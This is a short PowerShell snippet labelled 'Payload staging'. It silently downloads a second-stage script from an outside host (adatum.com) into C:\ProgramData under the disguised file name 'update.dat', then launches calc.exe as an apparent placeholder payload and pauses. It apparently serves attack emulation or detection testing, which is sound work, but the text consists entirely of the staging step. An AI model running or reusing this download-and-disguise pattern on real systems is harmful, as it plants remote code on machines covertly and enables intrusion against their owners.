
<# Payload staging #> $DownloadUrl = 'https://adatum.com/stage2.ps1'; $DropPath = "C:\ProgramData\update.dat"; curl.exe -s -L -o $DropPath $DownloadUrl; & "calc.exe"; Start-Sleep -Seconds 44
